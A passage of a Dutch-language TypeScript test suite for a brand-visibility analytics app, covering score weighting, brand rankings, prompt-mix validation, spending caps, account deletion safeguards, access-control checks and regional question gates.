      const u = distributePotentialByWeight([
        { id: "a", analysisId, potential: 40, targetWeight: null },
        { id: "b", analysisId, potential: 40, targetWeight: null },
      ]);
      return u.get("a") === 40 && u.get("b") === 40;
    })(),
  );
  ok(
    "een onbekend gewicht binnen een groep houdt de groepsscore (geen gegokte nul)",
    (() => {
      const u = distributePotentialByWeight([
        { id: "a", analysisId, potential: 40, targetWeight: 2 },
        { id: "b", analysisId, potential: 40, targetWeight: null },
      ]);
      return u.get("a") === 40 && u.get("b") === 40;
    })(),
  );
  ok(
    "null potentie blijft null, en telt niet mee in een groep",
    distributePotentialByWeight([{ id: "a", analysisId, potential: null, targetWeight: 1 }]).get("a") === null,
  );
  ok(
    "twee kansen uit VERSCHILLENDE analyses met dezelfde score worden niet met elkaar vergeleken",
    (() => {
      const u = distributePotentialByWeight([
        { id: "a", analysisId: "cluster-1", potential: 50, targetWeight: 5 },
        { id: "b", analysisId: "cluster-2", potential: 50, targetWeight: 0.1 },
      ]);
      return u.get("a") === 50 && u.get("b") === 50;
    })(),
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nMerken op een rij: iedereen op dezelfde manier geteld");

group("ownMentionCount: de kale telling terug uit het percentage", () => {
  ok("50% van 30 winbare vragen is 15", ownMentionCount(50, 30) === 15);
  ok("0% is 0", ownMentionCount(0, 30) === 0);
  ok("100% is alles", ownMentionCount(100, 12) === 12);
  ok("geen winbare vragen is 0", ownMentionCount(40, 0) === 0);
});

group("buildBrandRankings: iedereen door dezelfde noemer, niet 'Jij' apart", () => {
  const basis = {
    own: {
      name: "Jij",
      score: 40, // 40% van de winbare vragen, dus een ANDER cijfer dan de tabel zo meteen toont
      winnableRuns: 20,
      avgPosition: 2.1,
      firstMentionCount: 3,
      citationCount: 2,
    },
    competitors: [
      // citationCount bekend (migratie 0058 is voor deze periode al gedraaid).
      { name: "Concurrent A", mentionsCount: 18, avgPosition: 1.4, firstMentionCount: 10, citationCount: 4 },
      // citationCount nog nooit berekend (oude periode): moet "-" blijven, geen 0%.
      { name: "Concurrent B", mentionsCount: 6, avgPosition: 2.8, firstMentionCount: 1, citationCount: null },
      { name: "Toevalstreffer", mentionsCount: 1, avgPosition: 3.0, firstMentionCount: 0, citationCount: 0 },
    ],
    measuredRunCount: 30,
  };

  const { rows, omitted, fragmented } = buildBrandRankings(basis);
  ok("niet versnipperd: er zijn terugkerende concurrenten", !fragmented);
  ok("de eenmalige treffer valt weg", omitted === 1);
  ok("drie merken blijven over (jij + twee concurrenten)", rows.length === 3, String(rows.length));

  // ⚠️ HET KERNPUNT: "Jij" heeft 40% van de WINBARE vragen (score.score), maar
  // in deze tabel telt iedereen over measuredRunCount (30). Jouw kale telling
  // is dus round(40/100 * 20) = 8, dat is 8/30 ≈ 27%, niet 40%.
  const jij = rows.find((r) => r.isOwnBrand)!;
  ok("de kale telling klopt (8 van de 20 winbare)", jij.mentions === 8, String(jij.mentions));
  ok("het percentage rekent over measuredRunCount, niet winnableRuns", jij.mentionRate === 27, String(jij.mentionRate));

  // Concurrent A (18 vermeldingen) staat hoger in aandeel dan "Jij" (8): die
  // moet dus BOVEN "Jij" in de rangorde staan, niet eronder vastgezet.
  ok("Concurrent A staat op de eerste plek", rows[0].name === "Concurrent A", rows[0].name);
  ok("'Jij' staat niet altijd bovenaan", rows[0].isOwnBrand === false);

  // Aandeel = jij + getoonde concurrenten samen (8 + 18 + 6 = 32), Concurrent A
  // is dus 18/32 = 56%, met de hand nagerekend.
  ok("aandeel klopt met de hand (18/32 ≈ 56%)", rows[0].shareOfVoice === 56, String(rows[0].shareOfVoice));

  // Concurrenten kunnen nu ook een citatiepercentage hebben (migratie 0058,
  // citesOwnSite): 4 van de 30 gemeten vragen is 13%.
  const concurrentA = rows.find((r) => r.name === "Concurrent A")!;
  ok("citationRate bekend bij een concurrent", concurrentA.citationRate === 13, String(concurrentA.citationRate));
  ok("citationRate is wél bekend bij jezelf", jij.citationRate !== null);

  // ⚠️ HET ONDERSCHEID DAT NIET VERLOREN MAG GAAN: null (nooit berekend) is
  // iets anders dan 0 (berekend, en het antwoord is nul). Concurrent B heeft
  // de eerste, Toevalstreffer zou de tweede hebben als hij niet al bij de
  // eenmalige-vermelding-drempel wegviel.
  const concurrentB = rows.find((r) => r.name === "Concurrent B")!;
  ok("citationRate blijft null als het nooit berekend is, geen gegokte 0%", concurrentB.citationRate === null);

  // Een compleet versnipperde markt: geen enkele concurrent komt twee keer voor.
  const versnipperd = buildBrandRankings({
    ...basis,
    competitors: [
      { name: "Eenmalig", mentionsCount: 1, avgPosition: 1, firstMentionCount: 0, citationCount: 0 },
    ],
  });
  ok("een versnipperde markt geeft fragmented", versnipperd.fragmented);

  // Geen concurrenten aangetroffen: geen versnippering, gewoon leeg.
  const geenConcurrenten = buildBrandRankings({ ...basis, competitors: [] });
  ok("geen concurrenten is niet hetzelfde als versnipperd", !geenConcurrenten.fragmented);
  ok("dan blijft alleen 'Jij' over", geenConcurrenten.rows.length === 1);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe promptverdeling per analyse (migratie 0054)");

group("resolveMix: null is de standaard, nul is een keuze", () => {
  ok(
    "een lege rij geeft 10/10/10",
    isDefaultMix(resolveMix({ prompts_orientatie: null, prompts_overweging: null, prompts_beslissing: null })),
  );
  ok("en null als geheel ook", isDefaultMix(resolveMix(null)));

  // Per fase apart terugvallen, niet als geheel: zet iemand alleen de
  // beslissingsfase en laat hij de rest leeg, dan hoort dat 10/10/20 te worden
  // en niet 10/10/10 met een genegeerde instelling.
  const deels = resolveMix({ prompts_orientatie: null, prompts_overweging: null, prompts_beslissing: 20 });
  ok("één fase gezet laat de rest op de standaard", deels["Oriëntatie"] === 10 && deels["Overweging"] === 10);
  ok("en neemt de gezette fase over", deels["Beslissing"] === 20);

  // ⚠️ DE KERN. Nul is een echte waarde en geen "niet ingevuld". Een analyse
  // zonder oriëntatievragen is een geldige keuze voor een lokale ondernemer die
  // alleen op koopmomenten beoordeeld wil worden. Met `??` zou dat stil 10
  // worden en zou hij tien vragen betalen die hij niet wilde.
  const metNul = resolveMix({ prompts_orientatie: 0, prompts_overweging: 10, prompts_beslissing: 20 });
  ok("nul blijft nul", metNul["Oriëntatie"] === 0);
  ok("en telt mee in het totaal", mixTotal(metNul) === 30);
});

group("checkMix: de grenzen, en waarom ze er zijn", () => {
  const goed = checkMix({ "Oriëntatie": 5, "Overweging": 10, "Beslissing": 25 });
  ok("een geldige verdeling komt erdoor", goed.ok);
  ok("en houdt de getallen", goed.ok && mixTotal(goed.mix) === 40);

  ok("nul in één fase mag", checkMix({ "Oriëntatie": 0, "Overweging": 10, "Beslissing": 10 }).ok);

  // Alles nul is een val: die analyse kan niets meten en blijft eeuwig op
  // 'meten' staan, zonder dat iemand ziet waarom.
  const leeg = checkMix({ "Oriëntatie": 0, "Overweging": 0, "Beslissing": 0 });
  ok("alles nul wordt geweigerd", !leeg.ok);
  ok("en de melding legt uit waarom", !leeg.ok && leeg.reason.includes("minstens één vraag"));

  const teveelPerFase = checkMix({ "Oriëntatie": 41, "Overweging": 10, "Beslissing": 10 });
  ok("meer dan 40 per fase wordt geweigerd", !teveelPerFase.ok);
  ok(
    "en de melding noemt de fase die fout is",
    !teveelPerFase.ok && teveelPerFase.reason.startsWith("Oriëntatie"),
  );

  const teveelTotaal = checkMix({ "Oriëntatie": 40, "Overweging": 40, "Beslissing": 40 });
  ok("meer dan 90 in totaal wordt geweigerd", !teveelTotaal.ok);
  ok(
    "en de melding noemt wat het zou kosten",
    !teveelTotaal.ok && teveelTotaal.reason.includes("$"),
  );

  ok("negatief mag niet", !checkMix({ "Oriëntatie": -1, "Overweging": 10, "Beslissing": 10 }).ok);
  ok("kommagetal mag niet", !checkMix({ "Oriëntatie": 5.5, "Overweging": 10, "Beslissing": 10 }).ok);
  ok("onzin mag niet", !checkMix({ "Oriëntatie": "veel", "Overweging": 10, "Beslissing": 10 }).ok);
});

group("describeMix: wat het kost en wat het oplevert", () => {
  const zin = describeMix(DEFAULT_MIX);
  ok("noemt het totaal", zin.includes("30 vragen"));
  // $0,024 per vraag maal 30 is $0,72. Gemeten over 428 echte metingen.
  ok("noemt de maandkosten", zin.includes("$0.72"));
  // Bij dertig vragen en een score rond 30 is de 95%-band ±16,4 punten.
  ok("en de onzekerheidsmarge", zin.includes("16,4"));

  // ⚠️ De marge schaalt met de wortel: verdubbelen levert een kwart smallere
  // band, niet de helft. Dat is precies wat iemand moet weten vóórdat hij het
  // getal omhoog zet.
  const zestig = describeMix({ "Oriëntatie": 20, "Overweging": 20, "Beslissing": 20 });
  ok("zestig vragen kost twee keer zoveel", zestig.includes("$1.44"));
  ok("maar de marge wordt maar een kwart smaller", zestig.includes("11,6"));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe stille-fout-ronde (F5)");

group("requireCount: 'bestaat dit al?' mag nooit stil 'nee' worden", () => {
  ok("een gewone telling komt er gewoon uit", requireCount({ count: 3, error: null }, "iets") === 3);
  ok("en nul is een echt antwoord", requireCount({ count: 0, error: null }, "iets") === 0);

  // ⚠️ DE KERN. Het oude patroon was `(count ?? 0) > 0`. Bij een storing is
  // `count` null, wordt dat 0, en luidt de conclusie "er staat nog niets" dus
  // "doe het werk maar". De bescherming tegen dubbel betalen faalde precies op
  // het moment waarop een taak opnieuw geprobeerd werd.
  let gegooid = false;
  try {
    requireCount({ count: null, error: { message: "connection reset" } }, "de aanbodboom");
  } catch (err) {
    gegooid = true;
    const tekst = (err as Error).message;
    ok("de melding noemt waar het over ging", tekst.includes("de aanbodboom"));
    ok("en de oorspronkelijke fout", tekst.includes("connection reset"));
    ok("en waarom er gestopt wordt", tekst.includes("dubbel betaald"));
  }
  ok("een fout wordt een fout en geen nul", gegooid);

  // Geen fout maar toch geen getal hoort niet te kunnen. Gebeurt het toch, dan
  // is het dezelfde gok en dus ook een fout.
  let tweede = false;
  try {
    requireCount({ count: null, error: null }, "de vragen");
  } catch {
    tweede = true;
  }
  ok("null zonder fout is ook geen nul", tweede);
});

group("readKey: er niet, kapot en goed zijn drie dingen", () => {
  const geldig = JSON.stringify({ client_email: "a@b.iam.gserviceaccount.com", private_key: "sleutel" });

  ok("een lege variabele is afwezig", readKey(undefined).state === "afwezig");
  ok("spaties ook", readKey("   ").state === "afwezig");
  ok("een geldige sleutel is ok", readKey(geldig).state === "ok");

  // ⚠️ DE KERN. Dit gaf tot 12 augustus 2026 allemaal `null`, en de aanroeper
  // maakte daar "de sleutel is nog niet ingesteld" van. Bij een kapotte sleutel
  // stuurt die zin je iets instellen dat er al staat: een verkeerde diagnose,
  // en die kost meer tijd dan geen diagnose.
  const kapot = readKey("{dit is geen json");
  ok("kapotte JSON is onbruikbaar, niet afwezig", kapot.state === "onbruikbaar");
  ok(
    "en de melding zegt dat hij er wél staat",
    kapot.state === "onbruikbaar" && kapot.reason.includes("staat wél"),
  );

  const half = readKey(JSON.stringify({ client_email: "a@b.nl" }));
  ok("een ontbrekend veld is ook onbruikbaar", half.state === "onbruikbaar");
  ok(
    "en de melding noemt welk veld",
    half.state === "onbruikbaar" && half.reason.includes("private_key"),
  );

  // Sommige omgevingen bewaren een regeleinde als twee tekens. Dan weigert
  // OpenSSL de sleutel met een melding die nergens naar de oorzaak wijst.
  const metSlashN = readKey(JSON.stringify({ client_email: "a@b.nl", private_key: "regel1\\nregel2" }));
  ok(
    "een ontsnapt regeleinde wordt een echt regeleinde",
    metSlashN.state === "ok" && metSlashN.key.private_key === "regel1\nregel2",
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nEen klant volledig verwijderen (F4)");

group("de bevestiging is een handeling, geen vinkje", () => {
  // ⚠️ Naam overtypen en niet "weet je het zeker". Dit is K4 uit het
  // K4 (docs/logbook.md): onomkeerbaar wordt vooraf benoemd, en Nova doet het net zo.
  ok("de juiste naam klopt", confirmationMatches("Van den Udenhout", "Van den Udenhout"));
  ok("spaties eromheen mogen", confirmationMatches("  Van den Udenhout  ", "Van den Udenhout"));

  // Hoofdletters tellen wél mee: hoofdletterongevoelig maken haalt er precies
  // genoeg vanaf om het per ongeluk te kunnen doen.
  ok("hoofdletters tellen mee", !confirmationMatches("van den udenhout", "Van den Udenhout"));
  ok("een andere naam klopt niet", !confirmationMatches("Udenhout", "Van den Udenhout"));

  // ⚠️ Een leeg account mag nooit met een lege invoer te verwijderen zijn.
  ok("leeg tegen leeg klopt niet", !confirmationMatches("", ""));
  ok("leeg tegen een naam ook niet", !confirmationMatches("", "Van den Udenhout"));
});

group("het scherm zegt wat er verdwijnt, met aantallen", () => {
  const vol = { merken: 3, analyses: 5, metingen: 412, paginas: 12, gebruikers: 2 };
  const regels = deletionLines(vol);
  ok("alle vijf de soorten staan erin", regels.length === 5);
  ok("meervoud klopt", regels[0] === "3 merken" && regels[2] === "412 metingen");

  const een = deletionLines({ merken: 1, analyses: 1, metingen: 1, paginas: 1, gebruikers: 1 });
  ok("enkelvoud ook", een[0] === "1 merk" && een[1] === "1 analyse");

  // Een lijst met nullen leest als ruis en verbergt de aantallen die er wél
  // toe doen, dus die regels komen er niet in.
  const deels = deletionLines({ merken: 2, analyses: 0, metingen: 0, paginas: 0, gebruikers: 1 });
  ok("nul-regels worden weggelaten", deels.length === 2);
  ok("en wat er is blijft staan", deels[0] === "2 merken" && deels[1] === "1 inlogaccount");

  // Helemaal leeg krijgt één zin, want geen enkele regel zou lezen als een fout.
  const leeg = deletionLines({ merken: 0, analyses: 0, metingen: 0, paginas: 0, gebruikers: 0 });
  ok("een leeg account zegt dat het leeg is", leeg.length === 1 && leeg[0].includes("leeg"));

  // De waarschuwing zegt drie dingen, in deze volgorde: het kan niet terug, dit
  // gaat weg, en dit moet je doen. Begin je met de instructie, dan leest
  // niemand de waarschuwing meer.
  const w = deletionWarning("Van den Udenhout", vol);
  ok("de waarschuwing noemt het merk", w.includes("Van den Udenhout"));
  ok("en dat het niet terug kan", w.includes("niet ongedaan"));
  ok("en dat er geen prullenbak is", w.includes("geen prullenbak"));
  ok("en wat je moet doen", w.includes("Typ de naam"));
  ok("de aantallen staan erin", w.includes("412 metingen"));
});

group("je kunt jezelf niet buitensluiten", () => {
  // ⚠️ Geen beleefdheid maar een slot: een beheerder die zijn eigen account
  // weggooit, verwijdert zijn eigen inlog. Dat draai je niet terug met een
  // backup, want de sessie is dan al weg.
  ok(
    "je eigen account verwijderen mag niet",
    deletionBlockade({ accountId: "a", eigenAccountIds: ["a", "b"] }) !== null,
  );
  ok(
    "en de melding zegt wat je dan wel kunt doen",
    (deletionBlockade({ accountId: "a", eigenAccountIds: ["a"] }) ?? "").includes("andere beheerder"),
  );
  ok(
    "een ander account mag wel",
    deletionBlockade({ accountId: "c", eigenAccountIds: ["a", "b"] }) === null,
  );
  ok(
    "en zonder eigen accounts ook",
    deletionBlockade({ accountId: "c", eigenAccountIds: [] }) === null,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe toegangscontrole (F3)");

group("er is nog maar één plek met de drie lagen", () => {
  // ⚠️ BRONCODECONTROLE, om dezelfde reden als bij de kostenrem: de fout die
  // dit voorkomt is niet "de controle werkt niet" maar "er komt een laag bij en
  // één van de twee functies krijgt hem niet". Precies dat gebeurde op 11
  // augustus 2026 met migratie 0046: `getOwnedProfile` kreeg de accountlaag,
  // `getOwnedAnalysis` niet, en een uitgenodigde klant kon daardoor niets
  // goedkeuren terwijl hij alles wél zag staan.
  const profielBron = readFileSync("lib/profiles.ts", "utf8");
  const analyseBron = readFileSync("lib/analyses.ts", "utf8");
  const accessBron = readFileSync("lib/access.ts", "utf8");

  ok("profiles.ts vraagt het aan hasAccess", profielBron.includes("hasAccess("));
  ok("analyses.ts ook", analyseBron.includes("hasAccess("));

  // En ze mogen het niet meer zélf beslissen. Staat `isStaff(` of `isMember(`
  // weer in een van beide, dan is er een tweede oordeel bijgekomen.
  ok(
    "profiles.ts velt zelf geen oordeel meer",
    !profielBron.includes("isStaff(") && !profielBron.includes("isMember("),
  );
  ok(
    "analyses.ts ook niet",
    !analyseBron.includes("isStaff(") && !analyseBron.includes("isMember("),
  );

  // De drie lagen staan er alle drie, op die ene plek.
  ok("access.ts kent de eigenaarslaag", accessBron.includes("subject.ownerId === userId"));
  ok("access.ts kent de accountlaag", accessBron.includes("isMember(userId"));
  ok("access.ts kent de beheerderslaag", accessBron.includes("isStaff(userId)"));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nHet budgetplafond (F1)");

group("spendVerdict: onder, op en over het plafond", () => {
  // €50 plafond bij koers 1,08 is $54. De grens is `>=`: staat er precies het
  // plafond op, dan is het op.
  const onder = spendVerdict("maand", 40, 50);
  ok("ruim onder het plafond mag door", onder.ok);
  ok("en er is geen melding", onder.message === null);
  ok("het bedrag staat in euro's, niet in dollars", Math.abs(onder.spentEur - 37.04) < 0.01);

  const precies = spendVerdict("maand", 54, 50);
  ok("precies op het plafond is op", !precies.ok);

  const over = spendVerdict("maand", 60, 50);
  ok("erover blokkeert", !over.ok);
  ok("en noemt de maand", over.scope === "maand");

  // K2 (docs/logbook.md): elke foutmelding is specifiek. Drie dingen horen
  // erin, en de derde het meest: een blokkade zonder uitweg is een storing.
  const m = over.message ?? "";
  ok("de melding noemt het bedrag dat er staat", m.includes("55,56"));
  ok("en het plafond", m.includes("50,00"));
  ok("en waar je het verhoogt", m.includes("beheerscherm"));

  // Nederlandse notatie, met een vaste locale: de server in Vercel staat niet
  // op Nederlands en het bedrag hoort er voor iedereen hetzelfde uit te zien.
  ok("komma als decimaalteken", m.includes("€50,00") && !m.includes("€50.00"));
});

group("spendVerdict: het dagplafond heeft een eigen verhaal", () => {
  const dag = spendVerdict("dag", 200, 150);
  ok("het dagplafond blokkeert ook", !dag.ok);
  ok("en zegt dat het over alle klanten samen gaat", (dag.message ?? "").includes("alle klanten"));
  ok(
    "en dat dit de noodrem is, niet een normale grens",
    (dag.message ?? "").includes("noodrem"),
  );

  // ⚠️ Zit je tegen allebei aan, dan gaat het dagplafond voor: dat betekent dat
  // er iets aan de hand is over alle klanten heen, en dat wil je weten vóór je
  // het maandplafond van één account gaat verhogen.
  const beide = combinedVerdict(spendVerdict("dag", 200, 150), spendVerdict("maand", 60, 50));
  ok("het dagplafond wint van het maandplafond", beide.scope === "dag");

  const alleenMaand = combinedVerdict(spendVerdict("dag", 10, 150), spendVerdict("maand", 60, 50));
  ok("gaat de dag goed, dan telt de maand", alleenMaand.scope === "maand");

  const allebeiGoed = combinedVerdict(spendVerdict("dag", 10, 150), spendVerdict("maand", 10, 50));
  ok("en gaan ze allebei goed, dan mag het door", allebeiGoed.ok);
});

group("limitFromEnv: een typefout mag geen open kraan zijn", () => {
  ok("leeg valt terug op de standaard", limitFromEnv(undefined, 50) === 50);
  ok("spaties ook", limitFromEnv("   ", 50) === 50);
  ok("een getal wordt overgenomen", limitFromEnv("120", 50) === 120);
  ok("kommagetal ook", limitFromEnv("12.5", 50) === 12.5);

  // ⚠️ Dit is de kern: onzin in een omgevingsvariabele mag de rem niet
  // uitschakelen. Een `Number("abc")` is NaN, en NaN vergelijkt met alles als
  // `false`, dus `spentEur < NaN` zou élke uitgave doorlaten.
  ok("onzin valt terug op de standaard", limitFromEnv("abc", 50) === 50);
  ok("negatief ook", limitFromEnv("-10", 50) === 50);

  // Nul is wél een echte waarde: dat is "alles op slot".
  ok("nul is geldig en betekent op slot", limitFromEnv("0", 50) === 0);
  ok("en blokkeert dan ook echt alles", !spendVerdict("maand", 0, 0).ok);
});

group("de standaardbedragen staan waar ze op gekozen zijn", () => {
  // Gekozen op de echte cijfers van 11 augustus 2026: een klant met vier
  // onderwerpen kost ~$3,30 per maand aan metingen plus ~$2,80 aan tien
  // pagina's, ruwweg €6. Het plafond hoort daar een veelvoud boven te liggen,
  // anders raakt het een normale klant.
  ok("het maandplafond staat op €50", DEFAULT_MONTHLY_LIMIT_EUR === 50);
  ok("het dagplafond op €150", DEFAULT_DAILY_LIMIT_EUR === 150);
  ok(
    "en een normale klantmaand van ~€6 komt er niet in de buurt",
    spendVerdict("maand", 6 * 1.08, DEFAULT_MONTHLY_LIMIT_EUR).ok,
  );
  // Het dagplafond gaat over alle klanten samen en hoort een ramp te vangen,
  // geen drukke dag: twintig klanten die tegelijk hun maand goedgekeurd krijgen
  // is ~€52 en moet gewoon door kunnen.
  ok(
    "twintig goedkeuringen op één dag mag gewoon",
    spendVerdict("dag", 20 * 2.8, DEFAULT_DAILY_LIMIT_EUR).ok,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nRegionale vragen bij een lokaal merk (spoor R)");

group("containsRegion: plaats, provincie of nabijheid", () => {
  const regios = ["'s-Hertogenbosch", "Eindhoven", "Oss", "Breda"];

  ok("een plaatsnaam telt", containsRegion("Welke autodealer in Eindhoven is goed?", regios));
  ok(
    "een plaats met apostrof en koppelteken ook",
    containsRegion("Waar kan ik in 's-Hertogenbosch terecht?", regios),
  );
  // ⚠️ De provincie staat er los bij: `service_regions` bevat alleen plaatsen,
  // maar een zoeker zegt net zo vaak "in Brabant". Zonder die lijst zou precies
  // de vraag waar de klant om gaf als landelijk tellen.
  ok("de provincie telt ook", containsRegion("Welke dealer in Brabant?", regios));
  ok("nabijheid telt ook", containsRegion("Welke garage bij mij in de buurt?", regios));

  ok(
    "een landelijke vraag telt niet",
    !containsRegion("Waar moet ik op letten bij private lease in Nederland?", regios),
  );

  // ⚠️ Woordgrenzen zijn hier geen theorie: "Oss" staat écht in de regio's van
  // een Brabantse dealer, en zonder grenzen slaat hij aan op "grossier".
  ok("geen deelwoord: Oss in grossier telt niet", !containsRegion("Bij welke grossier?", regios));
  ok("en Breda niet in bredaad", !containsRegion("Een bredaad verhaal", regios));
});

group("geoBalance en het vangnet", () => {
  const regios = ["Eindhoven", "Breda"];
  const tien = [
    "Welke dealer in Eindhoven?",
    "Waar in Breda terecht?",
    "Welke garage in Eindhoven is open?",
    "Hoe werkt private lease?",
    "Wat kost een occasion?",
    "Welke merken zijn betrouwbaar?",
    "Hoeveel kilometer per jaar?",
    "Wat is het verschil tussen lease en kopen?",
    "Welke garantie krijg ik?",
    "Hoe lang duurt een APK?",
  ];

  const b = geoBalance(tien, regios, 10);
  ok("drie van de tien zijn regionaal", b.regionaal === 3);
  // ⚠️ Bij een lokaal merk moeten ze ALLEMAAL regionaal zijn. Een score is een
  // aandeel, en een vraag die dit bedrijf per definitie niet kan winnen maakt
  // dat aandeel niet "iets te laag" maar onwaar.
  ok("bij tien vragen zijn er tien nodig", b.nodig === 10);
  ok("dus zeven tekort", b.tekort === 7);
  ok("het aandeel klopt", Math.abs(b.aandeel - 0.3) < 0.001);

  // Het doel is het EINDaantal en niet wat er nu ligt: tijdens het bijvullen is
  // de set nog niet compleet en dan zou de drempel te laag uitvallen.
  ok("halverwege rekent hij nog steeds op het eindaantal", geoBalance(tien.slice(0, 5), regios, 10).nodig === 10);

  ok("een volle set heeft geen tekort", geoBalance(
    ["In Eindhoven?", "In Breda?", "Bij mij in de buurt?"], regios, 3,
  ).tekort === 0);

  // ⚠️ Wat er mag wijken: alleen landelijke vragen, en van achteren naar voren.
  // Het model zet zijn beste voorstel vooraan; de staart is inwisselbaar.
  const weg = droppableIndices(tien, regios, 2);
  ok("er wijken er twee", weg.length === 2);
  ok("en het zijn de laatste twee landelijke", weg[0] === 9 && weg[1] === 8);
  ok(
    "een regionale vraag wijkt nooit",
    droppableIndices(tien, regios, 10).every((i) => !containsRegion(tien[i], regios)),
  );

  // De drempel geldt alleen voor een lokaal merk.
  ok("een lokaal merk met regio's telt", isLokaal("lokaal", ["Breda"]));
  ok("zonder regio's niet", !isLokaal("lokaal", []));
  ok("en een landelijk merk niet", !isLokaal("landelijk", ["Breda"]));
  ok("bij een lokaal merk moeten alle vragen regionaal zijn", REGIO_DREMPEL === 1.0);
});

group("De poort voor handgeschreven vragen", () => {
  // ⚠️ De generator garandeert de regionale set met drie bijvulrondes. Zonder
  // deze poort haalde één tekstveld die garantie onderuit: een handmatig
  // toegevoegde landelijke vraag telt net zo hard mee in de noemer.
  const regios = ["Eindhoven", "Breda"];

  ok(
    "een landelijke vraag wordt geweigerd bij een lokaal merk",
    regionGateMessage("lokaal", regios, "Wat kost een occasion?") !== null,
  );
  ok(
    "en de melding noemt de plaatsen, zodat de volgende poging goed is",
    (regionGateMessage("lokaal", regios, "Wat kost een occasion?") ?? "").includes("Eindhoven, Breda"),
  );
  ok(
    "een regionale vraag mag gewoon",
    regionGateMessage("lokaal", regios, "Wat kost een occasion in Breda?") === null,
  );
  ok(
    "de provincie telt ook, die staat niet in service_regions",
    regionGateMessage("lokaal", regios, "Welke dealer in Brabant?") === null,
  );
  ok(
    "en 'bij mij in de buurt' ook: de assistent kent de locatie van de vrager",
    regionGateMessage("lokaal", regios, "Welke garage bij mij in de buurt?") === null,
  );

  // Een merk zonder lokaal bereik heeft deze regel niet. Dat is geen detail:
  // vier van de negen profielen op productie hadden op 11 augustus 2026
  // `service_scope = null`, en dan mag de poort niet dichtslaan.
  ok(
    "een landelijk merk mag elke vraag",
    regionGateMessage("landelijk", [], "Wat kost een occasion?") === null,
  );
  ok(
    "en een merk zonder bereik ook",
    regionGateMessage(null, null, "Wat kost een occasion?") === null,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nOpenstaande vragen en de eindpoort (28 augustus 2026)");

group("openVragenTotaal: één getal voor drie plekken", () => {
  // ⚠️ Dit getal staat in de bovenbalk, als bolletje in de zijbalk én in de kop
  // van de vragenpagina. Drie plekken die het los uitrekenen lopen uit elkaar,
  // en dan staat er "3 openstaande vragen" boven een pagina die er twee toont.
  ok("open vragen plus open punten", openVragenTotaal({ openFacts: 2, gaps: 1 }) === 3);
  ok("niets open is nul", openVragenTotaal({ openFacts: 0, gaps: 0 }) === 0);
  // Een negatieve telling kan alleen uit een fout komen. Nul is dan het enige
  // eerlijke antwoord (conventie 3), en geen negatief getal op het scherm.
  ok("nooit onder nul", openVragenTotaal({ openFacts: -3, gaps: 0 }) === 0);
});

group("openVragenLabel: nul verdwijnt, één is enkelvoud", () => {
  // ⚠️ Bij nul verdwijnt de hele melding uit de bovenbalk, inclusief het
  // bolletje. Een balk die naast élk scherm "0 openstaande vragen" meldt vraagt
  // aandacht voor niets, en went binnen een dag weg.
  ok("nul levert geen melding op", openVragenLabel(0) === null);
  ok("en een negatief getal ook niet", openVragenLabel(-1) === null);
  ok("één is enkelvoud", openVragenLabel(1) === "1 openstaande vraag");
  ok("meer is meervoud", openVragenLabel(4) === "4 openstaande vragen");
});

group("eindpoort: geen definitieve versie met vragen open", () => {
  const dicht = eindpoort(2);
  ok("twee open vragen houden hem tegen", dicht.mag === false && dicht.open === 2);
  // ⚠️ De melding noemt de uitweg in dezelfde zin als de blokkade. Een melding
  // die alleen zegt wat niet mag, is een dood einde (`docs/ux-design.md` §4), en
  // dan weet de klant niet dat "weet ik niet" ook een antwoord is.
  ok("en de melding noemt de uitweg", /overslaan|sla de vraag dan over/i.test(dicht.melding));
  ok("en zegt waarom het uitmaakt", /geciteerd|algemeen/i.test(dicht.melding));

  const een = eindpoort(1);
  ok("één vraag is enkelvoud", een.melding.startsWith("Er staat nog één vraag open"));

  const open = eindpoort(0);
  ok("niets open, dus het mag", open.mag === true && open.open === 0);
  // Ook als het mag staat er iets: een lege melding zou het scherm laten zien
  // dat er niets gebeurd is, terwijl er juist een controle geslaagd is.
  ok("en er staat nog steeds een zin", open.melding.length > 0);

  // Een negatieve telling kan alleen uit een fout komen, en dan hoort de poort
  // open te staan: een geschreven pagina niet kunnen afronden omdat een telling
  // misging is erger dan een pagina afronden met een vraag open.
  ok("een onmogelijke telling blokkeert niet", eindpoort(-2).mag === true);
});

group("de vragenpagina staat in Strategie, tussen clusters en plan", () => {
  const items = brandNav("00000000-0000-0000-0000-000000000001", false);
  const strategie = items.filter((i) => i.hoofdstuk === "Strategie").map((i) => i.label);
  // ⚠️ De volgorde volgt de ronde: de clusters leveren de vragen, de antwoorden
  // voeden het plan, het plan levert de teksten. Contentplan stond vóór
  // Clusters, en dat las als "begin bij het plan" terwijl er zonder meting niets
  // te plannen valt.
  ok(
    "de volgorde is clusters, vragen, plan, bibliotheek",
    strategie.join(" · ") === "Clusters · Openstaande vragen · Contentplan · Bibliotheek",
    strategie.join(" · "),
  );
  // ⚠️ En hij staat niet meer onder Merkprofiel. Twee vragenschermen naast
  // elkaar is precies de splitsing die op 17 augustus 2026 is opgeheven.
  ok(
    "er is geen tweede vragenscherm",
    !items.some((i) => i.label === "Vraagt jouw input"),
  );
  ok(
    "en Merkprofiel houdt er twee over",
    items.filter((i) => i.hoofdstuk === "Merkprofiel").length === 2,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe appstructuur: hoofdstukken en doorverwijzingen (17 augustus 2026)");

group("de zijbalk kent vijf hoofdstukken plus Admin", () => {
  const merkId = "00000000-0000-0000-0000-000000000001";
  const klant = hoofdstukken([...brandNav(merkId, false), ...generalNav(false)]);
  const beheerder = hoofdstukken([...brandNav(merkId, true), ...generalNav(true)]);

  // De volgorde is besluit 11: Strategie vóór Analytics. Wie inlogt wil weten
  // wat hij moet doen, niet browsen in data.
  ok(
    "Strategie staat vóór Analytics",
    HOOFDSTUKKEN.indexOf("Strategie") < HOOFDSTUKKEN.indexOf("Analytics"),
  );
  ok(
    "en Overzicht staat vóór allebei",
    HOOFDSTUKKEN.indexOf("Overzicht") < HOOFDSTUKKEN.indexOf("Strategie"),
  );

  // Dit is het hele punt van de herindeling: van 7 regels met een bak van
  // negen naar hoogstens drie kinderen per kop.
  //
  // ⚠️ Admin mag er vier, sinds de onboardingsessie van 19 augustus 2026. Drie
